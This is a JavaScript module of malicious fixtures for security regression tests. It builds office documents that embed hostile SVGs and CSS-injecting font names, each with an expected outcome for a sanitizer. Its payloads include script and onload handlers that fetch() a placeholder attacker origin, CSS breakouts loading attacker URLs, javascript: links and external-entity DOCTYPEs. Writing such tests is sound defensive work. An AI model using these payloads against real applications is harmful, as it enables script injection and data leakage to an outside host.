// Malicious fixtures for the security regression tests (embedded SVG and font-name CSS injection).
// Shared by tests/security.test.mjs (parser level) and scripts/browser-security.mjs (browser level).
// Test-only; Node built-ins only. `attacker` is the origin every payload tries to reach.
import { makeZip } from "./zip.mjs";
import { makeFods, makeOds } from "./odf.mjs";

const imageRel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/image";

/** SVG that runs script, writes a localStorage marker and calls the attacker when it is opened as a document. */
export function evilSvg(attacker) {
  return `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="localStorage.setItem('ufp-pwned','onload');fetch('${attacker}/svg-onload')">`
    + `<script>document.title='SCRIPT-RAN';localStorage.setItem('ufp-pwned','script');fetch('${attacker}/svg-script')</script>`
    + `<rect width="100" height="100" fill="red"/></svg>`;
}

/**
 * Font names that try to leave the CSS string they are placed in. Each is written into an XML
 * attribute, so XML character references (&#10; and so on) reach the parser as raw characters.
 */
export function maliciousFontNames(attacker) {
  const overlay = (tag) => `;background-image:url(${attacker}/${tag});position:fixed;left:0;top:0;width:100vw;height:100vh;z-index:2147483647;background-color:#c00;x:`;
  return {
    newline: `Calibri&#10;${overlay("font-newline")}`,
    carriageReturn: `Calibri&#13;${overlay("font-cr")}`,
    formFeed: `Calibri&#12;${overlay("font-ff")}`,
    quote: `Calibri&quot;${overlay("font-quote")}`,
    backslash: `Calibri\\&quot;${overlay("font-backslash")}`,
    brace: `Calibri}*{background:url(${attacker}/font-brace)}`,
  };
}

const SVG_NS = "http://www.w3.org/2000/svg", XHTML_NS = "http://www.w3.org/1999/xhtml", XLINK_NS = "http://www.w3.org/1999/xlink";

/**
 * SVG sanitizer cases: namespace confusion, CSS-escaped and disguised url() values, non-element
 * nodes and entity tricks. `keep` lists text that must survive sanitizing (legitimate content);
 * `invalid` cases must be rejected as a whole. Every payload tries to reach `attacker`.
 */
export function svgSanitizerCases(attacker) {
  const script = (tag) => `document.title='SCRIPT-RAN';localStorage.setItem('ufp-pwned','${tag}');fetch('${attacker}/${tag}')`;
  const host = attacker.replace(/^https?:\/\//, "");
  return [
    { name: "xhtml elements inside svg", keep: ['id="kept"'],
      svg: `<svg xmlns="${SVG_NS}" xmlns:h="${XHTML_NS}" width="20" height="20"><h:script>${script("ns-h-script")}</h:script><h:iframe src="${attacker}/ns-iframe"/><h:img src="${attacker}/ns-img"/><h:style>*{background:url(${attacker}/ns-style)}</h:style><rect id="kept" width="10" height="10"/></svg>` },
    { name: "default namespace switched to xhtml", keep: ['id="kept"'],
      svg: `<svg xmlns="${SVG_NS}" width="20" height="20"><g xmlns="${XHTML_NS}"><script>${script("ns-default-script")}</script><img src="${attacker}/ns-default-img"/><rect width="5" height="5"/></g><rect id="kept" width="10" height="10"/></svg>` },
    { name: "allowed local names in foreign namespaces", keep: ['id="kept"'],
      svg: `<svg xmlns="${SVG_NS}" xmlns:x="urn:evil" xmlns:h="${XHTML_NS}" width="20" height="20"><x:rect onclick="${script("ns-x-rect")}" width="5" height="5"/><h:title>t</h:title><h:a href="javascript:${script("ns-a")}">a</h:a><x:g><rect width="1" height="1"/></x:g><rect id="kept" width="10" height="10"/></svg>` },
    { name: "svg-namespace elements outside the allowlist", keep: ['id="kept"'],
      svg: `<s:svg xmlns:s="${SVG_NS}" xmlns:xlink="${XLINK_NS}" width="20" height="20"><s:script>${script("ns-s-script")}</s:script><s:foreignObject><div xmlns="${XHTML_NS}"><img src="${attacker}/ns-fo-img"/></div></s:foreignObject><s:image href="${attacker}/ns-image" xlink:href="${attacker}/ns-image-xlink"/><s:use href="${attacker}/ns-use.svg#a"/><s:animate attributeName="fill" to="url(${attacker}/ns-animate)"/><s:set attributeName="onmouseover" to="alert(1)"/><s:style>@import url(${attacker}/ns-import);</s:style><s:a href="javascript:alert(1)"><s:rect width="1" height="1"/></s:a><s:rect id="kept" width="10" height="10"/></s:svg>` },
    { name: "namespaced and unlisted attributes", keep: ['id="kept"', 'width="10"'],
      svg: `<svg xmlns="${SVG_NS}" xmlns:xlink="${XLINK_NS}" xmlns:x="urn:evil" xmlns:h="${XHTML_NS}" width="20" height="20" onload="${script("ns-onload")}"><rect id="kept" width="10" height="10" xlink:href="${attacker}/ns-xlink" x:fill="url(${attacker}/ns-x-fill)" x:onload="${script("ns-x-onload")}" xml:base="${attacker}/" h:style="background:url(${attacker}/ns-h-style)" style="fill:url(${attacker}/ns-style-attr)" class="c" ONLOAD="${script("ns-upper-onload")}"/></svg>` },
    { name: "css-escaped and disguised url values", keep: ['fill="url(#g)"', 'id="g"', 'stop-color="#ff0000"'],
      svg: `<svg xmlns="${SVG_NS}" width="60" height="60"><defs><linearGradient id="g"><stop offset="0" stop-color="#ff0000"/><stop offset="1" stop-color="u\\72l(${attacker}/esc-stop)"/></linearGradient></defs>`
        + `<rect width="10" height="10" fill="u\\72l(${attacker}/esc-fill)"/><rect width="10" height="10" stroke="u\\72l(\\68ttp://${host}/esc-stroke)"/>`
        + `<rect width="10" height="10" fill="URL(${attacker}/esc-upper)"/><rect width="10" height="10" fill=" url( '${attacker}/esc-spaced' )"/><rect width="10" height="10" fill="url(#g) url(${attacker}/esc-second)"/>`
        + `<rect width="10" height="10" fill="url(#g) , url(${attacker}/esc-list)"/><rect width="10" height="10" fill="\\75rl(${attacker}/esc-u)"/><rect width="10" height="10" clip-path="url(${attacker}/esc-clip#a)" mask="u\\72l(${attacker}/esc-mask#m)"/>`
        + `<rect width="10" height="10" fill="image(${attacker}/esc-image)"/><rect width="10" height="10" opacity="url(${attacker}/esc-opacity)" transform="url(${attacker}/esc-transform)"/>`
        + `<text font-family="x;background:url(${attacker}/esc-font)">t</text><rect width="10" height="10" fill="url(#g)"/></svg>` },
    { name: "comments, processing instructions and CDATA", keep: [">ok<"],
      svg: `<?xml-stylesheet href="${attacker}/pi-prolog"?><svg xmlns="${SVG_NS}" width="20" height="20"><!--<script>x</script>--><?pi ${attacker}/pi?><text>ok<![CDATA[<script>${script("cdata")}</script>]]></text></svg>` },
    // Since 0.3.0 the sanitizer refuses any DOCTYPE (0.2.x expanded internal entities and dropped the DOCTYPE).
    { name: "DOCTYPE with an entity declaration", invalid: true,
      svg: `<?xml-stylesheet href="${attacker}/pi-prolog"?><!DOCTYPE svg [<!ENTITY e "<script>${script("entity-script")}</script>">]><svg xmlns="${SVG_NS}" width="20" height="20">&e;<text>ok</text></svg>` },
    { name: "DOCTYPE with an external entity", invalid: true,
      svg: `<!DOCTYPE svg [<!ENTITY x SYSTEM "${attacker}/external-entity">]><svg xmlns="${SVG_NS}" width="20" height="20"><text>&x;</text></svg>` },
    { name: "plain DOCTYPE", invalid: true,
      svg: `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="${SVG_NS}" width="20" height="20"/>` },
    { name: "markup characters and quotes in text and attribute values",
      keep: [">a &lt; b &amp; c &gt; d<", `font-family="&quot;Segoe UI&quot;, 'Arial'"`, "<desc>&lt;script&gt;alert(1)&lt;/script&gt;</desc>"],
      svg: `<svg xmlns="${SVG_NS}" width="20" height="20"><desc>&lt;script&gt;alert(1)&lt;/script&gt;</desc><text font-family="&quot;Segoe UI&quot;, 'Arial'">a &lt; b &amp; c &gt; d</text></svg>` },
    { name: "legitimate drawing survives", keep: ['<linearGradient id="grad"', 'stop-color="rgb(10, 20, 30)"', 'fill="url(#grad)"', 'transform="rotate(45 50 50)"', `font-family="'Segoe UI', sans-serif"`, ">Label<", 'd="M10 10 L90 90 Z"', 'clip-path="url(#clip)"', "<title>Chart</title>", 'fill="url(#grad) #000"', 'stroke="url(#grad) none"'],
      svg: `<svg xmlns="${SVG_NS}" xmlns:xlink="${XLINK_NS}" viewBox="0 0 100 100" width="100" height="100"><title>Chart</title><defs><linearGradient id="grad" x1="0" x2="1"><stop offset="0%" stop-color="rgb(10, 20, 30)"/><stop offset="100%" stop-color="#fff" stop-opacity="0.5"/></linearGradient><clipPath id="clip"><rect width="100" height="100"/></clipPath></defs>`
        + `<g clip-path="url(#clip)"><rect width="100" height="100" fill="url(#grad)" stroke="currentColor" stroke-width="2"/><path d="M10 10 L90 90 Z" fill="none" stroke="#123456" transform="rotate(45 50 50)"/><text x="10" y="50" font-family="'Segoe UI', sans-serif" font-size="12" text-anchor="start">Label</text><circle cx="50" cy="50" r="5" fill="url(#grad) #000" stroke="url(#grad) none"/></g></svg>` },
    { name: "svg root in the xhtml namespace", invalid: true,
      svg: `<svg xmlns="${XHTML_NS}"><script>${script("root-xhtml")}</script></svg>` },
    { name: "non-svg root element", invalid: true,
      svg: `<html xmlns="${XHTML_NS}"><body><script>${script("root-html")}</script></body></html>` },
    { name: "malformed svg", invalid: true,
      svg: `<svg xmlns="${SVG_NS}"><rect width="1"></svg>` },
  ];
}

const P = 'xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';
function pptx(spTree, { background = "", media = {}, theme } = {}) {
  return makeZip({
    "ppt/presentation.xml": `<p:presentation ${P}>${theme ? '<p:sldMasterIdLst><p:sldMasterId r:id="rId9"/></p:sldMasterIdLst>' : ""}<p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst></p:presentation>`,
    "ppt/_rels/presentation.xml.rels": `<Relationships><Relationship Id="rId1" Target="slides/slide1.xml"/>${theme ? '<Relationship Id="rId9" Target="slideMasters/slideMaster1.xml"/>' : ""}</Relationships>`,
    ...(theme ? {
      "ppt/slideMasters/slideMaster1.xml": `<p:sldMaster ${P}><p:cSld><p:spTree/></p:cSld><p:clrMap bg1="lt1" tx1="dk1"/></p:sldMaster>`,
      "ppt/slideMasters/_rels/slideMaster1.xml.rels": '<Relationships><Relationship Id="rId1" Target="../theme/theme1.xml"/></Relationships>',
      "ppt/theme/theme1.xml": theme,
    } : {}),
    "ppt/slides/slide1.xml": `<p:sld ${P}><p:cSld>${background}<p:spTree>${spTree}</p:spTree></p:cSld></p:sld>`,
    "ppt/slides/_rels/slide1.xml.rels": `<Relationships>${Object.keys(media).map((name, index) => `<Relationship Id="i${index + 1}" Type="${imageRel}" Target="../media/${name}"/>`).join("")}</Relationships>`,
    ...Object.fromEntries(Object.entries(media).map(([name, bytes]) => [`ppt/media/${name}`, bytes])),
  }, { deflate: true });
}
const xfrm = (x, y) => `<a:xfrm><a:off x="${x}" y="${y}"/><a:ext cx="2000000" cy="2000000"/></a:xfrm>`;
const picture = (embed, x = 0) => `<p:pic><p:nvPicPr><p:cNvPr id="2" name="p"/></p:nvPicPr><p:blipFill><a:blip r:embed="${embed}"/></p:blipFill><p:spPr>${xfrm(x, 0)}</p:spPr></p:pic>`;

const S = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';
function xlsx({ styles, theme, sheet = '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>cell</t></is></c></row></sheetData>', sheetRels = "", extra = {} }) {
  return makeZip({
    "xl/workbook.xml": `<workbook ${S}><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>`,
    "xl/_rels/workbook.xml.rels": `<Relationships><Relationship Id="rId1" Type="x/worksheet" Target="worksheets/sheet1.xml"/>${styles ? '<Relationship Id="rId2" Type="x/styles" Target="styles.xml"/>' : ""}${theme ? '<Relationship Id="rId3" Type="x/theme" Target="theme/theme1.xml"/>' : ""}</Relationships>`,
    ...(styles ? { "xl/styles.xml": styles } : {}),
    ...(theme ? { "xl/theme/theme1.xml": theme } : {}),
    "xl/worksheets/sheet1.xml": `<worksheet ${S}>${sheet}</worksheet>`,
    ...(sheetRels ? { "xl/worksheets/_rels/sheet1.xml.rels": `<Relationships>${sheetRels}</Relationships>` } : {}),
    ...extra,
  }, { deflate: true });
}
const fontTheme = (typeface) => `<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><a:themeElements><a:fontScheme name="f"><a:majorFont><a:latin typeface="${typeface}"/></a:majorFont><a:minorFont><a:latin typeface="${typeface}"/></a:minorFont></a:fontScheme></a:themeElements></a:theme>`;

/**
 * name -> { bytes, kind, expectSvgImages }: `expectSvgImages` is how many sanitized SVG images
 * should still be shown (embedded SVG keeps working, without its script); mislabelled media is dropped.
 */
export function securityFixtures(attacker) {
  const svg = new TextEncoder().encode(evilSvg(attacker)), fonts = maliciousFontNames(attacker);
  const fixtures = {};

  // SVG media embedded in PPTX pictures, shape fills and slide backgrounds, and in XLSX drawings.
  fixtures["pptx-svg-picture.pptx"] = { kind: "pptx", expectSvgImages: 1, bytes: pptx(picture("i1"), { media: { "evil.svg": svg } }) };
  fixtures["pptx-svg-shape.pptx"] = {
    kind: "pptx", expectSvgImages: 1,
    bytes: pptx(`<p:sp><p:nvSpPr><p:cNvPr id="3" name="s"/></p:nvSpPr><p:spPr>${xfrm(0, 0)}<a:prstGeom prst="ellipse"/><a:blipFill><a:blip r:embed="i1"/></a:blipFill></p:spPr></p:sp>`, { media: { "evil.svg": svg } }),
  };
  fixtures["pptx-svg-background.pptx"] = {
    kind: "pptx", expectSvgImages: 2, // the background picture and the useBgFill shape that shows it
    bytes: pptx(`<p:sp useBgFill="1"><p:nvSpPr><p:cNvPr id="4" name="b"/></p:nvSpPr><p:spPr>${xfrm(100000, 100000)}<a:prstGeom prst="rect"/></p:spPr></p:sp>`,
      { background: '<p:bg><p:bgPr><a:blipFill><a:blip r:embed="i1"/></a:blipFill></p:bgPr></p:bg>', media: { "evil.svg": svg } }),
  };
  // Namespace confusion and CSS-escaped url() values in embedded SVG: the image is kept, sanitized.
  const cases = svgSanitizerCases(attacker), caseSvg = (name) => new TextEncoder().encode(cases.find(entry => entry.name === name).svg);
  fixtures["pptx-svg-namespaces.pptx"] = { kind: "pptx", expectSvgImages: 1, bytes: pptx(picture("i1"), { media: { "ns.svg": caseSvg("namespaced and unlisted attributes") } }) };
  fixtures["pptx-svg-foreign-elements.pptx"] = { kind: "pptx", expectSvgImages: 1, bytes: pptx(picture("i1"), { media: { "ns.svg": caseSvg("svg-namespace elements outside the allowlist") } }) };
  fixtures["pptx-svg-escaped-url.pptx"] = { kind: "pptx", expectSvgImages: 1, bytes: pptx(picture("i1"), { media: { "esc.svg": caseSvg("css-escaped and disguised url values") } }) };
  // An embedded SVG whose root element is not in the SVG namespace is dropped entirely.
  fixtures["pptx-svg-xhtml-root.pptx"] = { kind: "pptx", expectSvgImages: 0, bytes: pptx(picture("i1"), { media: { "root.svg": caseSvg("svg root in the xhtml namespace") } }) };
  // SVG bytes behind a raster file name: the declared type is wrong and the signature check drops it.
  fixtures["pptx-svg-as-png.pptx"] = { kind: "pptx", expectSvgImages: 0, bytes: pptx(picture("i1"), { media: { "evil.png": svg } }) };
  const anchor = (col, embed) => `<xdr:twoCellAnchor><xdr:from><xdr:col>${col}</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>${col + 2}</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>5</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to><xdr:pic><xdr:blipFill><a:blip r:embed="${embed}"/></xdr:blipFill></xdr:pic></xdr:twoCellAnchor>`;
  fixtures["xlsx-svg-drawing.xlsx"] = {
    kind: "xlsx", expectSvgImages: 1,
    bytes: xlsx({
      sheet: '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>cell</t></is></c></row></sheetData><drawing r:id="rIdDraw"/>',
      sheetRels: '<Relationship Id="rIdDraw" Type="x/drawing" Target="../drawings/drawing1.xml"/>',
      extra: {
        "xl/drawings/drawing1.xml": `<xdr:wsDr xmlns:xdr="urn:xdr" xmlns:a="urn:a" xmlns:r="urn:r">${anchor(1, "rIdSvg")}${anchor(4, "rIdPng")}</xdr:wsDr>`,
        "xl/drawings/_rels/drawing1.xml.rels": `<Relationships><Relationship Id="rIdSvg" Type="${imageRel}" Target="../media/evil.svg"/><Relationship Id="rIdPng" Type="${imageRel}" Target="../media/evil.png"/></Relationships>`,
        "xl/media/evil.svg": svg, "xl/media/evil.png": svg,
      },
    }),
  };
  fixtures["docx-svg-as-png.docx"] = {
    kind: "docx", expectSvgImages: 0,
    bytes: makeZip({
      "word/document.xml": '<w:document xmlns:w="urn:w" xmlns:a="urn:a" xmlns:r="urn:r"><w:body><w:p><w:r><w:t>docx</w:t></w:r><w:r><w:drawing><a:blip r:embed="i1"/></w:drawing></w:r></w:p></w:body></w:document>',
      "word/_rels/document.xml.rels": `<Relationships><Relationship Id="i1" Type="${imageRel}" Target="media/evil.png"/></Relationships>`,
      "word/media/evil.png": svg,
    }, { deflate: true }),
  };

  // Malicious font names in XLSX cell fonts, the default font (headers, slicers) and theme typefaces.
  const names = Object.values(fonts);
  const xlsxFonts = names.map(name => `<font><sz val="11"/><name val="${name}"/></font>`).join("");
  const xfs = names.map((_, index) => `<xf fontId="${index}"/>`).join("");
  const cells = names.map((_, index) => `<c r="${String.fromCharCode(65 + index)}1" s="${index}" t="inlineStr"><is><t>cell</t></is></c>`).join("");
  fixtures["xlsx-font-names.xlsx"] = {
    kind: "xlsx", expectSvgImages: 0,
    bytes: xlsx({
      styles: `<styleSheet ${S}><fonts count="${names.length}">${xlsxFonts}</fonts><fills count="1"><fill><patternFill patternType="none"/></fill></fills><borders count="1"><border/></borders><cellXfs count="${names.length}">${xfs}</cellXfs></styleSheet>`,
      sheet: `<sheetData><row r="1">${cells}</row></sheetData>`,
    }),
  };
  fixtures["xlsx-theme-font.xlsx"] = {
    kind: "xlsx", expectSvgImages: 0,
    bytes: xlsx({
      theme: fontTheme(fonts.newline),
      styles: `<styleSheet ${S}><fonts count="1"><font><sz val="11"/><scheme val="minor"/></font></fonts><fills count="1"><fill><patternFill patternType="none"/></fill></fills><borders count="1"><border/></borders><cellXfs count="1"><xf fontId="0"/></cellXfs></styleSheet>`,
    }),
  };
  // DOCX run fonts, paragraph marks, document defaults and theme fonts (asciiTheme).
  fixtures["docx-font-names.docx"] = {
    kind: "docx", expectSvgImages: 0,
    bytes: makeZip({
      "word/document.xml": `<w:document xmlns:w="urn:w"><w:body>${names.map(name => `<w:p><w:r><w:rPr><w:rFonts w:ascii="${name}" w:hAnsi="${name}"/></w:rPr><w:t>docx</w:t></w:r></w:p>`).join("")}<w:p><w:pPr><w:rPr><w:rFonts w:ascii="${fonts.newline}"/></w:rPr></w:pPr><w:r><w:rPr><w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/></w:rPr><w:t>theme</w:t></w:r></w:p></w:body></w:document>`,
      "word/styles.xml": `<w:styles xmlns:w="urn:w"><w:docDefaults><w:rPrDefault><w:rPr><w:rFonts w:ascii="${fonts.newline}" w:hAnsi="${fonts.newline}"/></w:rPr></w:rPrDefault></w:docDefaults></w:styles>`,
      "word/theme/theme1.xml": fontTheme(fonts.carriageReturn),
    }, { deflate: true }),
  };
  fixtures["pptx-theme-font.pptx"] = {
    kind: "pptx", expectSvgImages: 0,
    bytes: pptx(`<p:sp><p:nvSpPr><p:cNvPr id="5" name="t"/></p:nvSpPr><p:spPr>${xfrm(0, 0)}</p:spPr><p:txBody><a:bodyPr/><a:p><a:r><a:rPr><a:latin typeface="+mn-lt"/></a:rPr><a:t>pptxtext</a:t></a:r></a:p></p:txBody></p:sp>`,
      { theme: fontTheme(fonts.newline) }),
  };

  // ODS and flat ODS font faces (svg:font-family) and direct fo:font-family.
  // XML 1.0 has no form feed, so the ODF parser rejects &#12; outright; the other names reach the model.
  const odfNames = Object.entries(fonts).filter(([kind]) => kind !== "formFeed").map(([, name]) => name);
  const faces = odfNames.map((name, index) => `<style:font-face style:name="Evil${index}" svg:font-family="${name}"/>`).join("");
  const automatic = odfNames.map((_, index) => `<style:style style:name="ce${index}" style:family="table-cell"><style:text-properties style:font-name="Evil${index}"/></style:style>`).join("")
    + `<style:style style:name="ceDirect" style:family="table-cell"><style:text-properties fo:font-family="${fonts.newline}"/></style:style>`;
  const odsCells = [...odfNames.map((_, index) => `ce${index}`), "ceDirect"].map(style => `<table:table-cell table:style-name="${style}" office:value-type="string"><text:p>cell</text:p></table:table-cell>`).join("");
  const odf = { fontFaces: faces, automatic, body: `<table:table table:name="S"><table:table-row>${odsCells}</table:table-row></table:table>` };
  fixtures["ods-font-names.ods"] = { kind: "ods", expectSvgImages: 0, bytes: makeOds(odf) };
  fixtures["fods-font-names.fods"] = { kind: "fods", expectSvgImages: 0, bytes: makeFods(odf) };
  return fixtures;
}
